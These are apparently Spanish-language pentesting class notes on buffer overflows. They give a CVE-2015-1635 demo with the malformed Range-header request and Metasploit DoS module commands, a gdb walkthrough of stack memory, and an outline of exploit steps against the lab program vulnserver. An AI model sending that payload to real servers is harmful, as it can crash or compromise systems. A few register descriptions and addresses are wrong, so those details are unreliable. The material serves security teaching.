---
title: Clase 05/06 - Buffer Overflows
date: 2024-10-24 06:20:00 -0500
categories: [Cybersecurity,Ethical Hacking,Pentesting,Exploitation Techniques,Buffer Overflows]
tags: [buffer overflow,exploit development,pentesting,reverse shell,msfvenom,shellcode,eip control,bad characters,fuzzing,xvulnerabilities]     # TAG names should always be lowercase
---

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">0. Demo de introducción.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


### Buffer Overflows

- Hoy vamos a explorar la vulnerabilidad CVE-2015-1635.
- Está relacionada con el servidor web de Microsoft, Internet Information , Services (IIS), específicamente en las versiones 6.0, 7.0, 7.5, y 8.0.
- Esta vulnerabilidad reside en el manejo de solicitudes HTTP en el servidor web que el servicio IIS implementa.

### Vulnerabilidad HTTP.sys (CVE-2015-1635): Ejecución Remota de Código en IIS
La vulnerabilidad **CVE-2015-1635**, conocida como la vulnerabilidad de **HTTP.sys**, es un fallo crítico en el controlador **HTTP.sys** de **Windows**, que maneja las solicitudes HTTP en el servidor **IIS** (**Internet Information Services**). 

Esta vulnerabilidad permite la **ejecución remota de código (RCE)**, lo que podría otorgar al atacante acceso completo al sistema con privilegios de nivel SYSTEM.

### Descripción General

**HTTP.sys** es un controlador de modo kernel en Windows que procesa solicitudes y respuestas HTTP, principalmente utilizado por IIS y otros servicios basados en web. Debido a su ejecución en modo kernel, cualquier vulnerabilidad en este controlador puede tener graves consecuencias, ya que el código malicioso que se ejecute a través de esta vulnerabilidad tendrá los mismos privilegios que el sistema.

### Naturaleza de la Vulnerabilidad
- **Tipo**: Ejecución Remota de Código (RCE)
- **CVE**: CVE-2015-1635
- **Sistemas Afectados**: Windows 7, Windows 8.x, Windows Server 2008 R2, Windows Server 2012 R2 y cualquier otro sistema con IIS y HTTP.sys habilitado.
- **Severidad**: Crítica

El fallo surge cuando **HTTP.sys** maneja de manera incorrecta solicitudes HTTP especialmente manipuladas que contienen el encabezado `Range` malformado. El encabezado `Range` permite a los clientes solicitar rangos específicos de bytes de un recurso. Un encabezado `Range` manipulado puede desencadenar una **corrupción de memoria** en el controlador **HTTP.sys**.

### Cómo Funciona el Exploit

1. **Solicitud HTTP Manipulada**: El atacante envía una solicitud HTTP especialmente diseñada que contiene un encabezado `Range` malformado al servidor objetivo.

Por ejemplo:

```http
GET / HTTP/1.1
Host: servidor-objetivo
Range: bytes=0-18446744073709551615
```

2. **Corrupción de Memoria**: Cuando el controlador HTTP.sys procesa este encabezado `Range` malformado, se produce una corrupción de memoria, lo que lleva a desbordamientos de búfer u otros problemas relacionados con la memoria.

3. **Ejecución Remota de Código**: Gracias al desbordamiento de búfer, el atacante puede tomar el control del flujo de ejecución de la memoria. Esto permite ejecutar código arbitrario con privilegios SYSTEM.

4. **Compromiso del Sistema**: Una vez que el atacante obtiene privilegios de SYSTEM, puede instalar programas maliciosos, robar información sensible, manipular datos o continuar explotando el sistema.

### Impacto de la Vulnerabilidad

- **Ejecución Remota de Código**: El atacante puede tomar control completo del servidor afectado sin necesidad de autenticarse previamente.
- **Escalación de Privilegios**: Dado que **HTTP.sys** se ejecuta en modo kernel, explotar esta vulnerabilidad otorga privilegios de SYSTEM, el nivel más alto de privilegios en un sistema Windows.
- **Superficie de Ataque Amplia**: Cualquier sistema Windows que use IIS o servicios que utilicen **HTTP.sys** es vulnerable si acepta solicitudes HTTP.

### Uso del Módulo de Metasploit `auxiliary/dos/http/ms15_034_ulonglongadd`
Para aprovechar esta vulnerabilidad, Metasploit ofrece un módulo específico que puedes utilizar para probar la presencia de esta vulnerabilidad en un servidor. El módulo que debes usar es el siguiente:

```bash
use auxiliary/dos/http/ms15_034_ulonglongadd
```

### Configuración del Módulo
1. **Cargar el módulo**: Abre Metasploit y carga el módulo con el comando:

```bash
use auxiliary/dos/http/ms15_034_ulonglongadd
```

2. **Configurar la dirección IP del objetivo**: Una vez cargado, configura el objetivo con el siguiente comando:

```bash
set RHOST ip address
```

3. **Ejecutar el ataque**: Ejecuta el módulo para comprobar si el servidor es vulnerable:

```bash
run
```

Este módulo comprobará si el servidor es vulnerable a la ejecución de código remoto o a una denegación de servicio (DoS) basada en el fallo de **HTTP.sys**. Si el servidor es vulnerable, podría colapsar o reiniciarse debido a la corrupción de memoria causada por el ataque.


### Mitigación y Soluciones

Microsoft lanzó un parche como parte de la actualización MS15-034 en abril de 2015 para solucionar esta vulnerabilidad. Se recomienda encarecidamente que se aplique este parche para proteger los sistemas vulnerables.

1. **Instalar el parche de seguridad**: Asegúrate de que todos los sistemas Windows afectados estén actualizados con el parche MS15-034.
2. **Restringir el acceso HTTP**: Limita el acceso a los servicios HTTP, especialmente en redes no confiables, hasta que se pueda aplicar el parche.
3. **Monitorización de logs**: Verifica las solicitudes HTTP que contengan encabezados Range inusuales, como Range: bytes=0-18446744073709551615.

**Fin de la Demo**

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">1. Introducción a los Buffer Overflows.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Buffer Overflow - Definición.
- Vulnerabilidad de seguridad que ocurre cuando un programa o proceso intenta almacenar más datos en un búfer (una zona de memoria temporal) de los que este puede contener.

- Los **búferes** son áreas de memoria asignadas para contener datos, como cadenas de texto o valores numéricos, y suelen tener un tamaño fijo.

- Cuando un programa no valida correctamente la cantidad de datos que se va a almacenar en el búfer, los datos adicionales pueden sobrescribir la memoria adyacente a dicha área.

- El concepto clave detrás de un Buffer Overflow es que el programa que gestiona la memoria no restringe adecuadamente el tamaño de los datos que se almacenan, lo que resulta en una violación de la estructura de la memoria del sistema. Este tipo de vulnerabilidad ha sido explotada históricamente para ejecutar ataques que permiten tomar control total del sistema afectado.

- En términos técnicos, los **Buffer Overflows** suelen estar relacionados con lenguajes de programación como C y C++, que no incluyen mecanismos automáticos de protección de memoria, como sí lo hacen lenguajes más modernos (Java, Python, Go). Este problema se agrava en sistemas donde se permite la ejecución directa de código en regiones de memoria donde ocurren estos desbordamientos, un aspecto que el atacante puede aprovechar para insertar código arbitrario.

### Historia y Contexto 

#### Años 60 - 70: Primeros indicios del problema

- El concepto de Buffer Overflow comenzó a observarse en los primeros sistemas, aunque no fue identificado como amenaza de seguridad. Los programadores notaron que la gestión de la memoria, si no se realizaba con cuidado, podía causar errores de ejecución.

#### 1988: El gusano Morris

- El gusano Morris fue considerado el primero gusano de Internet. Este exploit aprovechó una vulnerabilidad de desbordamiento en la función `gets()` de C, y logró propagarse rápidamente por sistemas UNIX, afectando un 10\% de las máquinas conectadas al ARPANET.

#### Década de los 90: Expansión del problema

- Durante los años 90, el Buffer Overflow fue identificado como una de las vulnerabilidades más explotadas, sobre todo en sistemas escritos en C y C++.

- Investigadores de seguridad como **Aleph One** publicaron en 1996 el artículo "Smashing The Stack For Fun and Profit", donde se explicaba cómo explotar un Buffer Overflow para controlar el flujo de ejecución de un programa. Este artículo fue un hito en la compresión y difusión del ataque.

#### 2000s: Medidas de protección y mitigación

- Code Red worm (2001).
- SQL Slammer (2003).
- La creciente notoriedad de los ataques llevó a los desarrolladores de sistemas operativos y compiladores a implementar mecanismos de protección:
    - **DEP (Data Execution Prevention)**: Introducido en sistemas Windows, este mecanismo evita que ciertos segmentos de memoria sean ejecutables, bloqueando así código inyectado en desbordamientos de búfer.
    - **ASLR (Address Space Layout Randomization)**: Introducido en sistemas como Linux y Windows, aleatoriza la disposición de los espacios de memoria, dificultando a los atacantes predecir dónde inyectar su código.
    - **Stack Canaries**: Pequeños valores aleatorios insertados en la pila para detectar modificaciones y prevenir que los ataques sobreescriban el flujo de control.

#### 2010s: Ataques más sofisticados

- Ataque Stagefright contra teléfonos Android (2015).

- A pesar de las mejoras en seguridad, los atacantes siguieron desarrollando técnicas más avanzadas como el **Return-Oriented Programming (ROP)**, que les permite explotar Buffer Overflows incluso en sistemas con protecciones como DEP y ASLR.

#### Actualidad: Persistencia del Problema

- Aún en la actualidad, los Buffers Overflows siguen siendo una de las vulnerabilidades más estudiadas y explotadas. A pesar de los avances en seguridad, siguen surgiendo vulnerabilidades en software moderno, especialmente en aplicaciones críticas o con gran base de código legado (legacy code).

- Organizaciones como **MITRE**, con su lista **CVE (Common Vulnerabilities and Exposures)**, catalogan múltiples vulnerabilidades de desbordamiento de búfer cada año, lo que resalta la importancia continua de este tipo de ataques.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">2. Estructura de la memoria.</font>
<hr style="border: none; height: 10px; background-color: #003b00;" />

### Estructura de la memoria de un programa

- Para entender cómo funciona un ataque buffer overflow, necesitamos entender cómo la memoria aloja la data en un proceso. 

- Cuando se ''corre'' programa, este necesita espacio de memoria para almacenar data.

- Para un programa típico en C, su memoria se divide en 05 segmentos, cada uno con su propio propósito.

![alt text](/assets/images/program-memory-layout.png)
*Figura 1. Diagrama de la memoria de un programa. [Fuente](https://web.ecs.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)*

- La Figura 1 describe los 05 segmentos en un diagrama de la memoria de un proceso.

- **Segmento Texto**: 
    - Almacena el código ejecutable del programa. 
    - Las instrucciones del código ejecutable del programa residen en esta sección de la memoria. 
    - Este bloque es usualmente sólo de lectura (read-only).

- **Segmento Data**: 
    - Almacena variables estáticas/globales que son inicializadas por el programador. 
    - Por ejemplo, la variable `a` definida en `static int a = 3` será almacenada en el segmento data.

- **Segmento BSS (Block Starting Symbol)**: 
    -Almacena variables estáticas/globales no inicializadas. 
    - Este segmento será copado con ceros por el sistema operativo, de tal modo que las variables no inicializadas son inicializadas con ceros. 
    - Por ejemplo, la variable `b` definida en `static int b` será almacenada en el segmento BSS, y es inicializada con cero.

- **El Heap**: 
    - El heap se usa para proporcionar espacio para asignación dinámica de memoria. 
    - Esta área es administrada por las funciones `malloc`, `calloc`, `realloc`, y `free`, las cuales son funciones pertenecientes a la biblioteca estándar de C, específicamente la librería `<stdlib.h>`.
    - Este segmento crece hacia arriba en la memoria a medida que se solicita más memoria dinámica.

- **El Stack**: 
    - Espacio de la memoria que se usa para almacenar variables locales definidas dentro de las funciones.
    - Es una estructura de datos tipo LIFO (Last in, First Out) que gestiona las llamadas o `calls` a funciones, variables locales y direcciones de retorno.
    - También almacena data relacionada a funciones tipo `calls`, tales como direcciones de retorno (return addresses), argumentos, etc.
    - El stack crece hacia abajo, lo que significa que las direcciones de memoria más recientes están más cerca de la parte baja de la memoria.

### Layout general de la memoria.

![alt text](/assets/images/general-memory-layout.png)
*Figura 2. Layout general de la memoria. [Link](https://courses.cs.washington.edu/courses/cse351/17sp/lectures/CSE351-L15-buffoverflow_17sp-ink-day2-new.pdf)*

### Ejemplo de asignación de memoria

![alt text](/assets/images/memory-allocation-example.png)
*Figura 3. Ejemplo de asignación de memoria. [Link](https://courses.cs.washington.edu/courses/cse351/17sp/lectures/CSE351-L15-buffoverflow_17sp-ink-day2-new.pdf)*

- Ahora, usemos la siguiente función de ejemplo:

```c
#include <stdlib.h>  // Add this line for malloc and free declarations

int x = 100;
int main()
{
    // data stored on stack
    int a=2;
    float b=2.5;
    static int y;
    // allocate memory on heap
    int *ptr = (int *) malloc(2*sizeof(int));
    // values 5 and 6 stored on heap
    ptr[0]=5;
    ptr[1]=6;
    // deallocate memory on heap
    free(ptr);
    return 1;
}
```
- En el programa anterior:
    - La variable `x` es una variable global inicializada dentro del programa. Esta variable será alojada en el **Segmento Data**.
    - La variable `y` es una variable estática que no es inicializada, por lo tanto, es alojada en el **Segmento BSS**.
    - Las variables `a` y `b` son variables locales, las cuales son almacenadas en el stack del programa.
    - La variable `ptr` es también una variable local. Por lo tanto, es almacenada en el stack. Sin embargo, `ptr` es un **pointer** (puntero), que apunta a un bloque de memoria, el cuál es alojado de manera dinámica usando la función `malloc()`; por lo tanto, cuando los valores `5` y `6` son asignados a `ptr[1]` y `ptr[2]`, estos punteros son almacenados en el **Segmento Heap**.


<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">3. Estructura del Stack.</font>
<hr style="border: none; height: 10px; background-color: #003b00;" />

- De acuerdo con la referencia [Link](https://web.ecs.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf), los buffer overflow pueden ocurrir en los segmentos *stack* y *heap*. Sin embargo, las maneras de explotarlos son muy diferentes.

- En esta sección, nos centraremos en buffer overflows a nivel del *stack*. Para entender su funcionamiento, necesitamos cómo funciona el *stack* y qué información es almacenada en el *stack*.

### Estructura de la memoria Stack

- El *Stack* se usa para almacenar data usada en invocaciones de función.
- Un programa se ejecuta como una serie de llamadas de funciones.
- Cuando una función es llamada, algún espacio en el *stack* es asignado para la ejecución de la función.
- Considere el siguiente código de ejemplo para la función `func()`, la cual tiene dos argumentos enteros (`a` y `b`) y dos variables locales enteras (`x` y `y`).



```c
void func(int a, int b)
{
int x, y;
x = a + b;
y = a - b;
}
```

- Cuando `func()` es llamada, un bloque de espacio de memoria será asignado en el top del *stack* (en la parte ''superior''), y se le denomina **stack frame**.

- El diagrama del **stack frame** se describe en la siguiente Figura 4.

![alt text](/assets/images/stack-frame-layout.png)
_Figura 4. Diagrama del stack frame de una función._

- Un stack frame tiene 04 regiones importantes:
    - **Argumentos**: Esta región almacena los valores para los argumentos que son pasados a la función. En nuestro caso, `func()` tiene 02 argumentos enteros. Cuando esta función es llamada, por ejemplo, `func(5,8)`, los los valores de los argumentos serán alojados dentro del stack, formando el inicio del stack frame. Debe notarse que los argumentos son alojados en orden reverso.

    - **Return Address**: Cuando la función finaliza y llega a la instrucción `return`, necesita saber a dónde retornar, es decir, el return address necesita ser almacenado en algún lugar. Antes de saltar al inicio de la función, la computadora aloja la dirección de la siguiente instrucción --la instrucción ubicada inmediatamente después de la instrucción de la invocación de la función-- en el top del stack, la cual es la región ''return address'' en el stack frame.

    - **Frame Pointer previo**:  El siguiente item que es alojado en el stack frame por el programa es el *frame pointer* (puntero de trama) para la frame previo.

    - **Variables locales**: la siguiente región es para almacenar las variables locales de la función. El orden real para esta región, tal como el orden de las variables locales, el tamaño real de la región, etc., es responsabilidad de los compiladores. Algunos compiladores pueden aleatorizar el orden de las variables locales, o dar espacio extra para esta región. Los programadores no deben asumir ningún orden en particular o tamaño para esta región.


### Registros del Stack

#### **ESP (Stack Pointer)**:

- Este registro apunta a la dirección de la parte más alta (top) del stack en cualquier momento dado. 
- Cada vez que se almacena algo en el stack (como variables locales o la dirección de retorno de una función), el valor de ESP se reduce.

#### **EBP (Base Pointer)**:

- El EBP marca el comienzo de un stack frame, que es la sección del stack reservada para una función específica.
- El stack frame contiene las variables locales de la función, los parámetros de entrada y la dirección de retorno.
- El EBP se mantiene fijo durante la ejecución de una función, mientras que el ESP puede cambiar.

#### **EIP (Instruction Pointer)**:

- Este registro contiene la dirección de la próxima instrucción a ejecutar en el programa.
- El EIP se actualiza constantemente mientras el programa se ejecuta, avanzando hacia la siguiente instrucción.
- Cuando se llama a una función, la dirección de retorno (la siguiente instrucción después de la llamada) se almacena en el stack, permitiendo que el EIP vuelva a esa dirección una vez que la función termina.

### Explicación de cómo funciona el Buffer Overflow

- En la imagen, tenemos el kernel (top) en el tope y el text (bottom). 

![alt text](/assets/images/memorystructure.png)

- Donde tenemos que centrarnos, es en el stack donde podemos ver los registros.
- La estructura del Stack es: ESP (top), Buffer Space, EBP, y el EIP (bottom).
- El Buffer Space se llena hacia abajo con caracteres propios del volcado de un programa a la memoria. 

![alt text](/assets/images/memorystacks.png)

- En un escenario protegido, el Buffer Space debería contener el tamaño del bloque de caracteres de modo que no traspase hacia el EBP.

![alt text](/assets/images/fillingbuffer.png)

- Pero, en un ataque buffer overflow:

![alt text](/assets/images/bufferoverflowattack.png)

- El EIP es el puntero que retorna la dirección de la siguiente función o programa a ejecutarse.
- Si tomamos control del EIP, entonces podemos ejecutar el siguiente programa. Es decir, podemos usar el EIP para apuntar a una dirección de memoria donde se encuentre nuestro código malicioso.

### Relación de los Registros con el Stack

- En el código de ejemplo:

```c
int x = 100;
int main()
{
    // data stored on stack
    int a=2;
    float b=2.5;
    static int y;
    // allocate memory on heap
    int *ptr = (int *) malloc(2*sizeof(int));
    // values 5 and 6 stored on heap
    ptr[0]=5;
    ptr[1]=6;
    // deallocate memory on heap
    free(ptr);
    return 1;
```

- Cuando se llama a una función en C (`main`), ocurre lo siguiente en el stack:

    1. **Llamada a la función**: Cuando se llama a `main()`, el EIP guarda la dirección de la siguiente instrucción (es decir, la dirección a la que se regresará cuando `main()` termine) en el stack.

    2. **Frame de la función**: Se crea un nuevo stack frame para la función. El valor del EBP se guarda en el stack, y el EBP se actualiza para apuntar al inicio del nuevo stack frame.

    3. **Variables locales**: Las variables locales de la función, como `a` y `b`, se almacenan en el stack. Estas variables son gestionadas en base a desplazamientos relativos a EBP.

    4. **Retorno de la función**: Una vez que la función termina, el stack se limpia, el ESP y el EBP se restauran a sus valores anteriores, y el EIP se actualiza con la dirección de retorno para continuar la ejecución del programa.

### Ejemplo con código:

**NOTA**
Paso previo instalar `gdb` en el Kali:

```bash
sudo apt update
sudo apt install gdb
```

- Nombrar el siguiente archivo como, por ejemplo, `test.c`:

```c
#include <stdlib.h>  // Add this line for malloc and free declarations

int x = 100;
int main()
{
    // data stored on stack
    int a=2;
    float b=2.5;
    static int y;
    // allocate memory on heap
    int *ptr = (int *) malloc(2*sizeof(int));
    // values 5 and 6 stored on heap
    ptr[0]=5;
    ptr[1]=6;
    // deallocate memory on heap
    free(ptr);
    return 1;
}
```

- Compilar el programa en modo debug (opción `-g` para generar la información de debugging en el ejecutable resultante):

```bash

gcc -g -o test test.c
```

- Ejecutar GDB con el programa compilado

```bash
gdb ./test

Reading symbols from ./test...
```

- Revisemos las instrucciones del archivo ejecutable ejecutando `disassemble main`:

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000001149 <+0>:	push   %rbp            
   0x000000000000114a <+1>:	mov    %rsp,%rbp
   0x000000000000114d <+4>:	sub    $0x10,%rsp
   0x0000000000001nex <+8>:	movl   $0x2,-0x4(%rbp)
   0x0000000000001158 <+15>:	movss  0xea4(%rip),%xmm0        # 0x2004
   0x0000000000001160 <+23>:	movss  %xmm0,-0x8(%rbp)
   0x0000000000001165 <+28>:	mov    $0x8,%edi
   0x000000000000116a <+33>:	call   0x1040 <malloc@plt>
   0x000000000000116f <+38>:	mov    %rax,-0x10(%rbp)
   0x0000000000001173 <+42>:	mov    -0x10(%rbp),%rax
   0x0000000000001177 <+46>:	movl   $0x5,(%rax)
   0x000000000000117d <+52>:	mov    -0x10(%rbp),%rax
   0x0000000000001181 <+56>:	add    $0x4,%rax
   0x0000000000001185 <+60>:	movl   $0x6,(%rax)
   0x000000000000118b <+66>:	mov    -0x10(%rbp),%rax
   0x000000000000118f <+70>:	mov    %rax,%rdi
   0x0000000000001192 <+73>:	call   0x1030 <free@plt>
   0x0000000000001197 <+78>:	mov    $0x1,%eax
   0x000000000000119c <+83>:	leave
   0x000000000000119d <+84>:	ret
End of assembler dump.
```
- Breve explicación:

    ```bash
    0x0000000000001149 <+0>:	push   %rbp            
    0x000000000000114a <+1>:	mov    %rsp,%rbp
    0x000000000000114d <+4>:	sub    $0x10,%rsp
    ```
    - Estas instrucciones configuran el stack frame para la función `main`.
        - `push %rbp` almacena el anterior base pointer. El base pointer es el registro que apunta a una dirección específica que marca el inicio del stack frame para esta función.
        - `mov %rsp, %rbp` establece un nuevo base pointer para la función `main`.
        - `sub $0x10, %rsp` asigna 16 bytes del stack para variables locales.

    - `int a = 2;`:

        ```bash
        0x0000000000001151 <+8>:	movl   $0x2,-0x4(%rbp)
        ```
        - La instrucción `movl $0x2, -0x4 ($rbp)` almacena el valor entero `2` en la ubicación de memoria `-0x4(%rbp)`, la cual representa la variable `a` en el stack.

    - `float b = 2.5;`:

        ```bash
        0x0000000000001158 <+15>:	movss  0xea4(%rip),%xmm0        # 0x2004
        0x0000000000001160 <+23>:	movss  %xmm0,-0x8(%rbp)
        ```
        - `movss 0xea4(%rip), %xmm0` carga el valor float `2.5` (almacenado en una ubicación de memoria constante) en el registro `xmm0`.
        - `movss %xmmo, -0x8(%rbp)` mueve este valor a la ubicación de `b` en el stack.

    - `int *ptr = (int *) malloc(2 * sizeof(int));`:
        ```bash
        0x0000000000001165 <+28>:	mov    $0x8,%edi
        0x000000000000116a <+33>:	call   0x1040 <malloc@plt>
        0x000000000000116f <+38>:	mov    %rax,-0x10(%rbp)
        ```
        - `mov $0x8, %edi` carga el argumento 8 (el tamaño para `2 * sizeof(int)`) al registro `edi`, el cual es usado por los argumentos de la función en sistemas de 32 bits (`x86_64`).
        - `call 0x1040 <malloc@plt>` llama a la función `malloc`.
        - `mov %rax, -0x10(%rbp)` almacena el puntero de retorno `ptr`, representado por `-0x10(%rbp)` en el stack.

    - `ptr[0] = 5;`:
        ```bash
        0x0000000000001173 <+42>:	mov    -0x10(%rbp),%rax
        0x0000000000001177 <+46>:	movl   $0x5,(%rax)
        ```
        - `mov -0x10(%rbp), %rax` mueve el puntero `ptr` del stack al registro `rax`.
        - `movl $0x5, (%rax)` almacena el valor entero `5` en la ubicación de memoria a la que apunta el puntero `ptr` (es decir, `ptr[0]`).

    - `ptr[1] = 6;`:
        ```bash
        0x000000000000117d <+52>:	mov    -0x10(%rbp),%rax
        0x0000000000001181 <+56>:	add    $0x4,%rax
        0x0000000000001185 <+60>:	movl   $0x6,(%rax)
        ```
        - `mov -0x10(%rbp), %rax` carga la dirección del puntero `ptr` de nuevo.
        - `add $0x4, %rax` ajusta la dirección por 4 bytes para que apunte a `ptr[1]` (el siguiente entero).
        - `movl $0x6, (%rax)` almacena el entero `6` en esta ubicación (es decir, `ptr[1]`).

    - `free(ptr);`:
        ```bash
        0x000000000000118b <+66>:	mov    -0x10(%rbp),%rax
        0x000000000000118f <+70>:	mov    %rax,%rdi
        0x0000000000001192 <+73>:	call   0x1030 <free@plt>
        ```
        - `mov -0x10(%rbp), %rax` carga el `ptr` en el registro `rax`.
        - `mov %rax, %rdi` mueve `ptr` al registro `rdi`, el cual es el primer registro del argumento para sistemas de 32 bits.
        - `call 0x1030 <free@plt>` llama a la función `free`, liberando la memoria asignada.

    - `return 1;`:
        ```bash
        0x000000000000119c <+83>:	leave
        0x000000000000119d <+84>:	ret
        ```
        - `leave` almacena el stack frame previo reseteando `rbp` y `rsp`.
        - `ret` retorna el control al caller.



- Colocar un punto de interrupción en la función `main()`:

```bash
(gdb) break main
Breakpoint 1 at 0x1151: file test.c, line 7.
```
- El programa se detendrá antes de ejecutar el código dentro de `main()`.

- Luego, ejecutar el programa

```bash
(gdb) run

Breakpoint 1, main () at test.c:7
7	    int a=2;
```

- Revisar los registros:

```bash
(gdb) info registers
rax            0x555555555149      93824992235849
rbx            0x7fffffffddb8      140737488346552
rcx            0x555555557dd8      93824992247256
rdx            0x7fffffffddc8      140737488346568
rsi            0x7fffffffddb8      140737488346552
rdi            0x1                 1
rbp            0x7fffffffdca0      0x7fffffffdca0
rsp            0x7fffffffdc90      0x7fffffffdc90
r8             0x0                 0
r9             0x7ffff7fcbe20      140737353924128
r10            0x7fffffffd9d0      140737488345552
r11            0x206               518
r12            0x0                 0
r13            0x7fffffffddc8      140737488346568
r14            0x7ffff7ffd000      140737354125312
r15            0x555555557dd8      93824992247256
rip            0x555555555151      0x555555555151 <main+8>    <<<
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7dba740      140737351755584
gs_base        0x0                 0
```

- Podemos ver 20 bytes a partir del instruction pointer `$rip`

```bash
(gdb) x/20x $rip
0x555555555151 <main+8>:	0x02fc45c7	0xf3000000	0xa405100f	0xf300000e
0x555555555161 <main+24>:	0xf845110f	0x000008bf	0xfed1e800	0x8948ffff
0x555555555171 <main+40>:	0x8b48f045	0x00c7f045	0x00000005	0xf0458b48
0x555555555181 <main+56>:	0x04c08348	0x000600c7	0x8b480000	0x8948f045
0x555555555191 <main+72>:	0xfe99e8c7	0x01b8ffff	0xc9000000	0x480000c3
```

- Pasamos a la siguiente instrucción:

```bash
(gdb) next

9	    float b = 2.5;
```

- En este punto, se puede seguir observando los registros después de cada instrucción usando `info registers` para ver cómo cambian ESP, EBP, y EIP. Por ejemplo:

    - ESP disminuirá a medida que se almacenen variables locales en el stack.
    - EBP se mantendrá constante dentro de una función, apuntando al inicio del stack frame.
    - EIP cambiará en cada instrucción ejecutada, apuntando a la siguiente instrucción que se ejecutará

```bash
(gdb) info registers
rax            0x555555555149      93824992235849
rbx            0x7fffffffddb8      140737488346552
rcx            0x555555557dd8      93824992247256
rdx            0x7fffffffddc8      140737488346568
rsi            0x7fffffffddb8      140737488346552
rdi            0x1                 1
rbp            0x7fffffffdca0      0x7fffffffdca0
rsp            0x7fffffffdc90      0x7fffffffdc90
r8             0x0                 0
r9             0x7ffff7fcbe20      140737353924128
r10            0x7fffffffd9d0      140737488345552
r11            0x206               518
r12            0x0                 0
r13            0x7fffffffddc8      140737488346568
r14            0x7ffff7ffd000      140737354125312
r15            0x555555557dd8      93824992247256
rip            0x555555555158      0x555555555158 <main+15>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7dba740      140737351755584
gs_base        0x0                 0
```

- Proseguimos con la siguiente instrucción:

```bash
(gdb) next
11	    int *ptr = (int *) malloc(2*sizeof(int));
```

- Revisemos los registros:

```bash
(gdb) info registers
rax            0x555555555149      93824992235849
rbx            0x7fffffffddb8      140737488346552
rcx            0x555555557dd8      93824992247256
rdx            0x7fffffffddc8      140737488346568
rsi            0x7fffffffddb8      140737488346552
rdi            0x1                 1
rbp            0x7fffffffdca0      0x7fffffffdca0
rsp            0x7fffffffdc90      0x7fffffffdc90
r8             0x0                 0
r9             0x7ffff7fcbe20      140737353924128
r10            0x7fffffffd9d0      140737488345552
r11            0x206               518
r12            0x0                 0
r13            0x7fffffffddc8      140737488346568
r14            0x7ffff7ffd000      140737354125312
r15            0x555555557dd8      93824992247256
rip            0x555555555165      0x555555555165 <main+28>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7dba740      140737351755584
gs_base        0x0                 0
```

- Cuando el programa se ejecuta, `rip` contiene la dirección virtual absoluta de la instrucción actual. En este caso, tenemos:
    - Dirección en ensamblador: `0x0000000000001165` (dirección relativa)
    - Dirección base de carga: `0x555555554000`
    - Dirección en `rip`: `0x555555554000 + 0x1165 = 0x555555555165`
- Así que `rip` apunta a la dirección virtual `0x555555555165`, que corresponde a `0x1165` dentro del archivo del programa, ajustada a la dirección base asignada por el sistema operativo.

- Ahora inspeccionemos el Stack Frame

```bash
(gdb) x/20x $rsp
0x7fffffffdc90:	0xffffdd70	0x00007fff	0x00000000	0x00000002
0x7fffffffdca0:	0x00000001	0x00000000	0xf7de6dba	0x00007fff
0x7fffffffdcb0:	0xffffdda0	0x00007fff	0x55555149	0x00005555
0x7fffffffdcc0:	0x55554040	0x00000001	0xffffddb8	0x00007fff
0x7fffffffdcd0:	0xffffddb8	0x00007fff	0xf5387fc4	0x4eed078e
```


- Este comando mostrará los primeros 20 bytes en la dirección a la que apunta el ESP. A medida que avancemos en la ejecución, veremos cómo las variables locales y las direcciones de retorno se almacenan en el stack.

- Ejemplo en el Código:
    - En el código proporcionado, cuando se llama a malloc, se reserva memoria en el heap, pero las variables locales como a y b (enteros y flotantes) se almacenan en el stack. Al ejecutar el programa, podrás observar cómo el ESP y el EBP gestionan el stack frame de main() y cómo el EIP avanza a medida que se ejecutan las instrucciones.

- Resumen
    - ESP: Apunta a la parte superior del stack y cambia constantemente conforme se añaden o eliminan elementos del stack.
    - EBP: Marca el inicio de un stack frame y se usa como referencia para acceder a las variables locales de una función.
    - EIP: Contiene la dirección de la siguiente instrucción que se ejecutará y cambia después de cada instrucción ejecutada.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">4. Pasos para un Desbordamiento de Búfer.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

Los pasos básicos que seguiremos para realizar un ataque de desbordamiento de búfer son los siguientes:

- **Spiking**: Un método que utilizaremos para encontrar partes vulnerables en un programa.
- **Fuzzing**: Enviaremos una gran cantidad de caracteres a un programa para ver si podemos hacerlo fallar y determinar en qué punto sucede el fallo (offset).
- **Control del EIP**: Una vez tengamos el offset, sobrescribiremos el registro EIP para tomar control del flujo del programa.
- **Identificación de caracteres malos**: Limpiaremos el código de los caracteres que puedan causar problemas.
- **Generación de shellcode**: Crearemos un código malicioso que nos permitirá obtener un reverse shell y tomar el control del sistema.

## Herramientas a utilizar

Para completar esta sección, utilizaremos una serie de herramientas:

- **Kali Linux**: Será nuestro sistema atacante, aunque puedes utilizar cualquier distribución de Linux que prefieras. Modo Bridge con ip estática.
- **Máquina con Windows**: para ejecutar el servidor vulnerable. Si es VM, en Modo Bridge con ip estática en el mismo rango que la ip del Kali.
- **Vulnerable Server (Voland Server)**: Este software vulnerable se ejecutará en nuestra máquina Windows. Descargar el `vulnserver.exe` y el archivo `essfunc.dll`. Colocar ambos archivos en una misma carpeta. ([Link](https://github.com/stephenbradshaw/vulnserver)).
- **Immunity Debugger**: Nos permitirá analizar el comportamiento del programa y realizar el seguimiento del desbordamiento de búfer ([Link](https://debugger.immunityinc.com/)).
- **Módulos Mona**: Módulos adicionales para el Immunity Debugger. Descargar el archivo `mona.py` y colocarlo en C > Program Files (x86) > Immunity Inc >  Immunity Debugger > PyCommands ([Link](https://github.com/corelan/mona)).


